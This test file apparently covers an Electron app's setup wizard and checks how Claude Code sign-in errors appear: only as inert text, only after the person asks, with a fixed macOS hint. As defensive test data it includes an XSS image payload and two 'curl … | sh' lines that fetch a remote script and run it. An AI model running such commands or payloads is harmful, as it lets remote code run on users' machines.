'use strict';
// The first-run wizard's sign-in step when Claude Code's sign-in check still
// fails after sign-in has started. The main process sends one cleaned line or
// a fixed kind with the check's answer (electron/sign-in-reason.js); the step
// shows the line as Claude Code's own words, set apart and only ever as text,
// and on macOS follows a line that reads as a sign-in failure with a fixed
// hint about CLAUDE_CONFIG_DIR. Only a check the person asks for, with "I've
// finished signing in", shows the line: the automatic checks that run while
// they are still in the terminal stay quiet.
const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { JSDOM } = require('jsdom');

const WIZARD_HTML = path.join(__dirname, '..', '..', 'electron', 'wizard.html');

const OAUTH = 'Failed to authenticate: OAuth session expired and could not be refreshed';
const LIMIT = 'Claude usage limit reached. Your limit will reset at 5pm.';
const NETWORK = 'API Error: Connection error. getaddrinfo ENOTFOUND api.example.invalid';
const COMMAND = 'launchctl setenv CLAUDE_CONFIG_DIR "<that folder>"';
const NOT_LOGGED_IN = 'Not logged in · Please run /login';
const BEFORE_SIGN_IN_HINT = 'Click Sign in to Claude below. A terminal opens to complete the sign-in.';
const ASK = "I've finished signing in";
const WAITING = 'Waiting for sign-in...';
const said = (text, signIn) => ({ kind: 'said', text, signIn });
const failing = (reason) => ({ status: 'not-authenticated', reason });

// The wizard with a stub of the desktop's bridge. The wizard polls every 3 s;
// here the intervals are recorded but never fire, and each test runs the next
// check itself. While `hold` is set, each check waits for the test to answer
// or reject it, so the order the answers arrive in is the test's to choose.
function loadWizard({ platform = 'darwin', claude = failing(said(OAUTH, true)) } = {}) {
  const html = fs.readFileSync(WIZARD_HTML, 'utf8');
  const runtimes = (answer) => ({ claude: answer, codex: { installed: false, authenticated: false } });
  const state = {
    claude, signInClaude: async () => ({ ok: true }), done: false,
    calls: 0, hold: false, held: [], intervals: [], cleared: [],
  };
  const dom = new JSDOM(html, {
    runScripts: 'dangerously',
    beforeParse(window) {
      window.electronAPI = {
        platform,
        checkRuntimes: () => {
          state.calls += 1;
          if (!state.hold) return Promise.resolve(runtimes(state.claude));
          return new Promise((resolve, reject) => {
            state.held.push({ answer: (answer) => resolve(runtimes(answer)), reject });
          });
        },
        signInClaude: () => state.signInClaude(),
        signInCodex: async () => ({ ok: true }),
        wizardDone: () => { state.done = true; },
      };
      window.setInterval = (fn, ms) => state.intervals.push({ fn, ms });
      window.clearInterval = (id) => { state.cleared.push(id); };
    },
  });
  const w = dom.window;
  const doc = w.document;
  const settle = () => new Promise((resolve) => setTimeout(resolve, 20));
  return {
    w,
    doc,
    state,
    settle,
    step: () => doc.getElementById('step-auth'),
    box: () => doc.getElementById('auth-reason'),
    // The text the step shows for the reason, or '' when it shows none.
    shown() {
      const box = doc.getElementById('auth-reason');
      return box && !box.hidden ? box.textContent : '';
    },
    saidLine: () => doc.querySelector('#auth-reason .reason-said'),
    command: () => doc.querySelector('#auth-reason .reason-command'),
    signinButton: () => doc.getElementById('btn-signin'),
    askButton: () => doc.getElementById('btn-signin-done'),
    // What the person sees of the sign-in step and its buttons, to compare
    // before and after an answer that should change nothing.
    view() {
      const button = (id) => {
        const el = doc.getElementById(id);
        return [el.style.display, el.disabled, el.textContent];
      };
      return JSON.stringify([doc.getElementById('step-auth').outerHTML,
        button('btn-signin'), button('btn-signin-done'), button('btn-check')]);
    },
    async signIn() { await w.signIn(); },
    // An automatic check: the one the wizard's interval runs.
    async check(answer) { state.claude = answer; await w.checkStatus(); },
    // An asked check: the person clicks "I've finished signing in".
    async ask(answer) {
      state.claude = answer;
      doc.getElementById('btn-signin-done').click();
      await settle();
    },
    hold() { state.hold = true; },
    close: () => w.close(),
  };
}

// Sign in, then the person asks and that check still fails with `reason`.
async function askedAfterSignIn(reason, options) {
  const wiz = loadWizard(options);
  await wiz.settle();
  await wiz.signIn();
  await wiz.ask(failing(reason));
  return wiz;
}

// The declarations of one rule in the wizard's own stylesheet, whitespace
// collapsed, so a test can pin a declaration without pinning the formatting.
function ruleBody(selector) {
  const html = fs.readFileSync(WIZARD_HTML, 'utf8');
  const style = html.slice(html.indexOf('<style>'), html.indexOf('</style>'));
  const start = style.indexOf('\n    ' + selector + ' {');
  assert.ok(start >= 0, 'the stylesheet has a ' + selector + ' rule');
  const body = style.slice(style.indexOf('{', start) + 1, style.indexOf('}', start));
  return body.replace(/\s+/g, ' ').trim();
}

describe('before sign-in starts', () => {
  test('a failing check before sign-in shows the step as it does today', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    assert.ok(!wiz.step().textContent.includes('Claude Code said'), 'no line before sign-in');
    assert.ok(!wiz.step().textContent.includes('OAuth'), 'none of the output before sign-in');
    assert.strictEqual(wiz.shown(), '');
    assert.strictEqual(wiz.doc.getElementById('auth-hint').textContent, BEFORE_SIGN_IN_HINT);
    const btn = wiz.doc.getElementById('btn-signin');
    assert.strictEqual(btn.textContent, 'Sign in to Claude');
    assert.strictEqual(btn.disabled, false);
    wiz.close();
  });

  test('a pass before sign-in shows no line or hint and the wizard advances', async () => {
    const wiz = loadWizard({ claude: { status: 'ready' } });
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });
});

describe('while a sign-in is in progress, automatic checks stay quiet', () => {
  test('the first automatic check after the terminal opens shows no false alarm on macOS', async () => {
    const wiz = loadWizard({ platform: 'darwin' });
    await wiz.settle();
    await wiz.signIn();
    await wiz.check(failing(said(NOT_LOGGED_IN, true)));
    assert.strictEqual(wiz.shown(), '', 'no line');
    assert.ok(!wiz.step().textContent.includes('Claude Code said'));
    assert.ok(!wiz.step().textContent.includes(NOT_LOGGED_IN));
    assert.ok(!wiz.step().textContent.includes('launchctl'), 'no hint');
    assert.strictEqual(wiz.signinButton().disabled, true);
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    wiz.close();
  });

  test('failing automatic checks keep running and leave the step waiting, until one passes and the wizard advances', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    // The first load's install poll stops itself once Claude Code is found,
    // so the sign-in starts its own automatic check.
    await wiz.state.intervals[0].fn();
    await wiz.signIn();
    const id = wiz.state.intervals.length;
    const poll = wiz.state.intervals[id - 1];
    assert.strictEqual(poll.fn, wiz.w.checkStatus, 'signing in schedules the automatic check');
    assert.strictEqual(poll.ms, 3000);
    const waiting = wiz.view();
    for (const reason of [said(NOT_LOGGED_IN, true), said(OAUTH, true), { kind: 'timeout' }, { kind: 'no-reason' }, undefined]) {
      wiz.state.claude = failing(reason);
      await poll.fn();
      assert.strictEqual(wiz.view(), waiting, 'unchanged after ' + JSON.stringify(reason));
    }
    assert.strictEqual(wiz.shown(), '');
    assert.strictEqual(wiz.signinButton().disabled, true);
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    assert.ok(!wiz.state.cleared.includes(id), 'the automatic check is still scheduled');
    wiz.state.claude = { status: 'ready' };
    await poll.fn();
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    assert.ok(wiz.state.cleared.includes(id), 'a pass stops it, as before');
    wiz.close();
  });
});

describe("the I've finished signing in button", () => {
  test('it shows beside Sign in only once a sign-in has opened, as a real button, and the hint points to it', async () => {
    const install = loadWizard({ claude: { status: 'not-installed' } });
    await install.settle();
    assert.strictEqual(install.askButton().style.display, 'none', 'not on the install step');
    install.close();

    const wiz = loadWizard();
    await wiz.settle();
    const btn = wiz.askButton();
    assert.strictEqual(btn.style.display, 'none', 'not before sign-in starts');
    wiz.state.signInClaude = async () => ({ ok: false, reason: 'failed' });
    await wiz.signIn();
    assert.strictEqual(btn.style.display, 'none', 'not after a sign-in that could not open');
    wiz.state.signInClaude = async () => ({ ok: true });
    await wiz.signIn();
    assert.strictEqual(btn.style.display, 'inline-block', 'shown once a sign-in has opened');
    assert.strictEqual(btn.tagName, 'BUTTON');
    assert.strictEqual(btn.textContent, ASK);
    assert.strictEqual(btn.disabled, false);
    assert.strictEqual(btn.getAttribute('tabindex'), null);
    assert.strictEqual(btn.tabIndex, 0, 'reachable from the keyboard');
    assert.strictEqual(wiz.signinButton().nextElementSibling, btn, 'beside the Sign in button');
    assert.strictEqual(btn.className, 'btn-secondary', 'styled as the secondary action');
    assert.match(wiz.doc.getElementById('auth-hint').textContent,
      /This screen continues automatically once you finish\. If it doesn't, click I've finished signing in\.$/);
    await wiz.check({ status: 'not-installed' });
    assert.strictEqual(btn.style.display, 'none', 'not when the step goes back to install');
    await wiz.check(failing(said(OAUTH, true)));
    assert.strictEqual(btn.style.display, 'inline-block', 'back with the sign-in step');
    await wiz.check({ status: 'ready' });
    assert.strictEqual(btn.style.display, 'none', 'not once the step is done');
    wiz.close();
  });

  test('asking runs one check at once, reads Checking... while it runs, and a failing answer shows with both buttons enabled again', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    await wiz.signIn();
    wiz.hold();
    const before = wiz.state.calls;
    const btn = wiz.askButton();
    btn.click();
    assert.strictEqual(wiz.state.calls, before + 1, 'one check, at once');
    assert.strictEqual(btn.textContent, 'Checking...');
    assert.strictEqual(btn.disabled, true);
    btn.click();
    await wiz.settle();
    assert.strictEqual(wiz.state.calls, before + 1, 'a second click starts nothing');
    assert.strictEqual(wiz.shown(), '', 'nothing shows before the answer');
    wiz.state.held[0].answer(failing(said(NOT_LOGGED_IN, true)));
    await wiz.settle();
    assert.strictEqual(wiz.doc.querySelector('#auth-reason .reason-label').textContent, 'Claude Code said:');
    assert.strictEqual(wiz.saidLine().textContent, NOT_LOGGED_IN);
    assert.strictEqual(wiz.command().textContent, COMMAND, 'the macOS hint for a sign-in line');
    assert.strictEqual(wiz.signinButton().disabled, false);
    assert.strictEqual(wiz.signinButton().textContent, 'Sign in to Claude');
    assert.strictEqual(btn.disabled, false);
    assert.strictEqual(btn.textContent, ASK);
    // An answer that carries no reason at all shows the fixed no-reason line.
    wiz.state.hold = false;
    await wiz.ask({ status: 'not-authenticated' });
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    wiz.close();
  });

  test('only an asked check writes the line, and an automatic answer never replaces or removes it except by passing', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.strictEqual(wiz.saidLine().textContent, OAUTH);
    const first = wiz.view();
    await wiz.check(failing(said(LIMIT, false)));
    await wiz.check(failing({ kind: 'timeout' }));
    assert.strictEqual(wiz.view(), first, 'later automatic failures leave the line and the Sign in button');

    wiz.hold();
    // One automatic check starts before an asked one, one while it runs.
    const before = wiz.w.checkStatus();
    wiz.askButton().click();
    const during = wiz.w.checkStatus();
    const [beforeCheck, askedCheck, duringCheck] = wiz.state.held;
    const asking = wiz.view();
    duringCheck.answer(failing(said(LIMIT, false)));
    await during;
    assert.strictEqual(wiz.view(), asking, 'an automatic failure while asking changes nothing');
    askedCheck.answer(failing(said(NETWORK, false)));
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, NETWORK, 'asking again replaces the line');
    assert.strictEqual(wiz.command(), null);
    const second = wiz.view();
    beforeCheck.answer(failing(said(OAUTH, true)));
    await before;
    assert.strictEqual(wiz.view(), second, 'an automatic check from before the ask, answering after it');

    wiz.askButton().click();
    const late = wiz.w.checkStatus();
    wiz.state.held[3].answer(failing(said(LIMIT, false)));
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, LIMIT);
    const third = wiz.view();
    wiz.state.held[4].answer(failing(said(OAUTH, true)));
    await late;
    assert.strictEqual(wiz.view(), third, 'an automatic check from during the ask, answering after it');

    const passing = wiz.w.checkStatus();
    wiz.askButton().click();
    wiz.state.held[6].answer(failing(said(NETWORK, false)));
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, NETWORK);
    wiz.state.held[5].answer({ status: 'ready' });
    await passing;
    assert.strictEqual(wiz.shown(), '', 'a late automatic pass removes the line');
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });

  test('a new sign-in clears the line and starts quiet, and an asked answer from before it opened shows nothing', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.ok(wiz.command(), 'the line and the hint showed first');
    wiz.hold();
    wiz.askButton().click();
    wiz.signinButton().click();
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '', 'the line goes when the terminal opens');
    assert.ok(!wiz.step().textContent.includes('launchctl'), 'and the hint');
    assert.strictEqual(wiz.signinButton().disabled, true);
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    assert.strictEqual(wiz.askButton().style.display, 'inline-block', 'the ask button stays');
    wiz.state.held[0].answer(failing(said(LIMIT, false)));
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '', 'the earlier ask shows nothing');
    assert.strictEqual(wiz.signinButton().disabled, true);
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    assert.strictEqual(wiz.askButton().disabled, false);
    assert.strictEqual(wiz.askButton().textContent, ASK);
    wiz.state.hold = false;
    await wiz.check(failing(said(NOT_LOGGED_IN, true)));
    assert.strictEqual(wiz.shown(), '', 'automatic checks are quiet again');
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    await wiz.ask(failing(said(NETWORK, false)));
    assert.strictEqual(wiz.saidLine().textContent, NETWORK, 'until the person asks');
    let open;
    wiz.state.signInClaude = () => new Promise((resolve) => { open = resolve; });
    wiz.hold();
    wiz.askButton().click();
    wiz.signinButton().click();
    wiz.state.held[1].answer(failing(said(LIMIT, false)));
    await wiz.settle();
    open({ ok: true });
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '', 'an answer that landed while the terminal opened goes too');
    assert.strictEqual(wiz.signinButton().disabled, true);
    assert.strictEqual(wiz.signinButton().textContent, WAITING);
    wiz.state.hold = false;
    await wiz.ask(failing(said(NETWORK, false)));
    wiz.state.signInClaude = async () => ({ ok: false, reason: 'failed' });
    wiz.signinButton().click();
    await wiz.settle();
    assert.strictEqual(wiz.doc.getElementById('auth-hint').textContent,
      'Could not start sign-in: Something stopped it opening.');
    wiz.close();
  });

  test("the line reaches the page only through the step's text renderer, on every path", async () => {
    const html = fs.readFileSync(WIZARD_HTML, 'utf8');
    const script = html.slice(html.indexOf('<script>'));
    assert.strictEqual(script.split("getElementById('auth-reason')").length - 1, 1,
      'one function writes the reason box');
    const text = '<img src=x onerror="window.__ran=1"> marker-line-41';
    const wiz = loadWizard();
    await wiz.settle();
    await wiz.signIn();
    await wiz.check(failing(said(text, true)));
    assert.ok(!wiz.doc.body.textContent.includes('marker-line-41'), 'an automatic check puts it nowhere');
    await wiz.ask(failing(said(text, true)));
    assert.strictEqual(wiz.doc.body.textContent.split('marker-line-41').length - 1, 1, 'shown once');
    assert.strictEqual(wiz.saidLine().textContent, text, 'as the line, in its own element');
    assert.strictEqual(wiz.saidLine().children.length, 0);
    assert.strictEqual(wiz.doc.querySelectorAll('img, [onerror]').length, 0);
    await wiz.settle();
    assert.strictEqual(wiz.w.__ran, undefined);
    wiz.close();
  });
});

describe('the sign-in sequences', () => {
  test('a passing check, automatic or asked, shows no line, advances the wizard and takes the ask button with the step', async () => {
    for (const asked of [false, true]) {
      const wiz = loadWizard();
      await wiz.settle();
      await wiz.signIn();
      if (asked) await wiz.ask({ status: 'ready' });
      else await wiz.check({ status: 'ready' });
      assert.strictEqual(wiz.shown(), '', 'asked: ' + asked);
      assert.ok(!wiz.step().textContent.includes('launchctl'));
      assert.ok(wiz.step().className.includes('done'));
      assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
      assert.strictEqual(wiz.askButton().style.display, 'none');
      wiz.close();
    }
  });

  test('a line from an asked check goes with its hint and both sign-in buttons when the next check passes, automatic or asked', async () => {
    for (const asked of [false, true]) {
      const wiz = await askedAfterSignIn(said(OAUTH, true));
      assert.ok(wiz.command(), 'the line and the hint showed first');
      if (asked) await wiz.ask({ status: 'ready' });
      else await wiz.check({ status: 'ready' });
      assert.strictEqual(wiz.shown(), '', 'asked: ' + asked);
      assert.ok(!wiz.step().textContent.includes(OAUTH));
      assert.ok(!wiz.step().textContent.includes('launchctl'));
      assert.strictEqual(wiz.signinButton().style.display, 'none');
      assert.strictEqual(wiz.askButton().style.display, 'none');
      assert.ok(wiz.step().className.includes('done'));
      wiz.close();
    }
  });

  test('finishing in the terminal advances on the next automatic check with no click, and no line ever shows', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    const added = [];
    new wiz.w.MutationObserver((records) => {
      for (const record of records) if (record.addedNodes.length) added.push(record);
    }).observe(wiz.box(), { childList: true, subtree: true });
    await wiz.signIn();
    const before = wiz.state.calls;
    await wiz.check(failing(said(NOT_LOGGED_IN, true)));
    await wiz.check(failing(said(NOT_LOGGED_IN, true)));
    await wiz.check({ status: 'ready' });
    await wiz.settle();
    assert.strictEqual(wiz.state.calls, before + 3, 'only the automatic checks ran');
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    assert.strictEqual(added.length, 0, 'no line ever showed');
    assert.strictEqual(wiz.box().hidden, true);
    wiz.close();
  });

  test('a rejected asked check shows the fixed no-reason line and never the error, and a rejected automatic check changes nothing', async () => {
    const error = 'bridge-failure-detail-93';
    const wiz = loadWizard();
    await wiz.settle();
    await wiz.signIn();
    wiz.hold();
    const waiting = wiz.view();
    const auto = wiz.w.checkStatus();
    wiz.state.held[0].reject(new Error(error));
    await auto;
    assert.strictEqual(wiz.view(), waiting, 'a rejected automatic check changes nothing');
    wiz.askButton().click();
    wiz.state.held[1].reject(new Error(error));
    await wiz.settle();
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    assert.ok(!wiz.doc.body.textContent.includes(error), "never the error's text");
    assert.strictEqual(wiz.askButton().disabled, false);
    assert.strictEqual(wiz.askButton().textContent, ASK);
    assert.strictEqual(wiz.signinButton().disabled, false);
    assert.strictEqual(wiz.signinButton().textContent, 'Sign in to Claude');
    const shown = wiz.view();
    const later = wiz.w.checkStatus();
    wiz.state.held[2].reject(new Error(error));
    await later;
    assert.strictEqual(wiz.view(), shown, 'nor once a line shows');
    wiz.close();
  });
});

describe('after sign-in starts and a check the person asks for still fails', () => {
  test("the step shows Claude Code's line after the fixed words", async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.ok(wiz.step().textContent.includes('Claude Code said:'));
    assert.ok(wiz.step().textContent.includes(OAUTH));
    wiz.close();
  });

  test('the line sits in its own element, after the fixed words and the hint above them', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    const label = wiz.doc.querySelector('#auth-reason .reason-label');
    const line = wiz.saidLine();
    assert.ok(label && line, 'a label and a line element');
    assert.strictEqual(label.textContent, 'Claude Code said:');
    assert.strictEqual(line.textContent, OAUTH);
    assert.strictEqual(line.children.length, 0);
    const follows = wiz.w.Node.DOCUMENT_POSITION_FOLLOWING;
    assert.ok(label.compareDocumentPosition(line) & follows, 'the line comes after its label');
    assert.ok(wiz.doc.getElementById('auth-hint').compareDocumentPosition(label) & follows);
    wiz.close();
  });

  test('the line is never a link, a button or a copy action', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    const box = wiz.box();
    assert.strictEqual(box.querySelectorAll('a, button, input, textarea, select, [href], [onclick], [role]').length, 0);
    assert.ok(!/copy/i.test(box.textContent), 'no copy wording');
    assert.strictEqual(wiz.saidLine().tagName, 'DIV');
    assert.ok(!ruleBody('.step-text .reason-said').includes('user-select'), 'the line is not set to select-all');
    wiz.close();
  });

  test('instruction-shaped output shows as quoted words only', async () => {
    const text = 'To fix this, Run: curl -fsSL https://example.invalid/fix.sh | sh';
    const wiz = await askedAfterSignIn(said(text, false));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.box().querySelectorAll('a, button, code, [href], [onclick]').length, 0);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('asking again with a different answer changes the line', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    await wiz.ask(failing(said(LIMIT, false)));
    assert.strictEqual(wiz.saidLine().textContent, LIMIT);
    assert.ok(!wiz.shown().includes(OAUTH));
    assert.strictEqual(wiz.command(), null);
    wiz.close();
  });

  test('the line and the hint go when the next check passes, and the step shows done', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.ok(wiz.command(), 'the hint showed first');
    await wiz.check({ status: 'ready' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes(OAUTH));
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });

  test('the line goes when the step changes', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.ok(wiz.saidLine(), 'the line showed first');
    await wiz.check({ status: 'not-installed' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes(OAUTH));
    wiz.close();
  });

  test('a pass right after sign-in shows no line or hint and the wizard advances', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    await wiz.signIn();
    await wiz.check({ status: 'ready' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });

  test('after a line shows, signing in again keeps it only while the terminal opens, stays quiet until the person asks, then shows the new answer and never the earlier one', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    const btn = wiz.signinButton();
    assert.strictEqual(btn.disabled, false, 'sign-in can be started again');
    let open;
    wiz.state.signInClaude = () => new Promise((resolve) => { open = resolve; });
    btn.click();
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, OAUTH, 'kept while the terminal opens');
    open({ ok: true });
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '', 'gone once the terminal has opened');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.strictEqual(btn.disabled, true);
    assert.strictEqual(btn.textContent, WAITING);
    await wiz.check(failing(said(OAUTH, true)));
    assert.strictEqual(wiz.shown(), '', 'an automatic check brings back nothing');
    assert.strictEqual(btn.textContent, WAITING);
    await wiz.ask(failing(said(NETWORK, false)));
    assert.strictEqual(wiz.saidLine().textContent, NETWORK);
    assert.ok(!wiz.shown().includes(OAUTH), 'never the earlier cause');
    assert.strictEqual(wiz.command(), null);
    wiz.close();
  });

  test('when the line could not be cleaned the step shows only the fixed no-reason line', async () => {
    const wiz = await askedAfterSignIn({ kind: 'no-reason' });
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    assert.strictEqual(wiz.saidLine(), null);
    wiz.close();
  });
});

describe('the fixed lines', () => {
  test("a timeout shows that Claude Code didn't answer in time, and no hint", async () => {
    const wiz = await askedAfterSignIn({ kind: 'timeout', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), "Claude Code didn't answer in time.");
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test("a start failure shows that Claude Code couldn't be started, and no hint", async () => {
    const wiz = await askedAfterSignIn({ kind: 'not-started', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), "Claude Code couldn't be started.");
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('a failure with no usable output shows that Claude Code gave no reason, and no hint', async () => {
    const wiz = await askedAfterSignIn({ kind: 'no-reason', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });
});

describe('the line is text, never markup', () => {
  test('markup in the line shows as written, creates no element and runs nothing', async () => {
    const text = '<img src=x onerror="window.__ran=1"> <b>bold</b>';
    const wiz = await askedAfterSignIn(said(text, false));
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.saidLine().children.length, 0);
    assert.strictEqual(wiz.doc.querySelectorAll('img, b, [onerror]').length, 0);
    assert.strictEqual(wiz.w.__ran, undefined);
    wiz.close();
  });

  test('entities in the line show as written, never decoded', async () => {
    const text = '&lt;b&gt;bold&lt;/b&gt; &amp; &#x27;quoted&#x27;';
    const wiz = await askedAfterSignIn(said(text, false));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.doc.querySelectorAll('b').length, 0);
    wiz.close();
  });

  test('the wizard adds no markup write: its five fixed ones are all there are', () => {
    const html = fs.readFileSync(WIZARD_HTML, 'utf8');
    const writes = html.split(/innerHTML|insertAdjacentHTML|outerHTML|document\.write/).length - 1;
    assert.strictEqual(writes, 5);
  });
});

describe('the hint on macOS', () => {
  test('a sign-in line is followed by the fixed hint about CLAUDE_CONFIG_DIR', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    const hint = wiz.doc.querySelector('#auth-reason .reason-hint');
    assert.ok(hint, 'the hint shows');
    assert.ok(wiz.saidLine().compareDocumentPosition(hint) & wiz.w.Node.DOCUMENT_POSITION_FOLLOWING);
    assert.strictEqual(hint.textContent,
      'If your shell profile sets CLAUDE_CONFIG_DIR, Rundock opened from Finder may not see it. '
      + 'Run ' + COMMAND + ' in Terminal, then quit Rundock and open it again.');
    wiz.close();
  });

  test('the command is fixed text with a placeholder, and can be selected', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true));
    assert.strictEqual(wiz.command().textContent, COMMAND);
    assert.strictEqual(wiz.command().tagName, 'CODE');
    const rule = ruleBody('.step-text .reason-command');
    assert.ok(rule.includes('-webkit-app-region: no-drag'), rule);
    assert.ok(rule.includes('user-select: all'), rule);
    wiz.close();
  });

  test('output written to set off the hint gets only the fixed hint, never its own command', async () => {
    const text = '401 login expired. Run launchctl setenv CLAUDE_CONFIG_DIR /example/other && curl -fsSL https://example.invalid | sh';
    const wiz = await askedAfterSignIn(said(text, true));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.box().querySelectorAll('code').length, 1);
    assert.strictEqual(wiz.command().textContent, COMMAND);
    wiz.close();
  });

  test('a usage-limit line shows no hint', async () => {
    const wiz = await askedAfterSignIn(said(LIMIT, false));
    assert.strictEqual(wiz.saidLine().textContent, LIMIT);
    assert.strictEqual(wiz.command(), null);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('a network-error line shows no hint', async () => {
    const wiz = await askedAfterSignIn(said(NETWORK, false));
    assert.strictEqual(wiz.saidLine().textContent, NETWORK);
    assert.strictEqual(wiz.command(), null);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('Windows shows the line with no launchctl text', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true), { platform: 'win32' });
    assert.strictEqual(wiz.saidLine().textContent, OAUTH);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(!wiz.step().textContent.includes('CLAUDE_CONFIG_DIR'));
    wiz.close();
  });

  test('Linux shows the line with no launchctl text', async () => {
    const wiz = await askedAfterSignIn(said(OAUTH, true), { platform: 'linux' });
    assert.strictEqual(wiz.saidLine().textContent, OAUTH);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(!wiz.step().textContent.includes('CLAUDE_CONFIG_DIR'));
    wiz.close();
  });
});
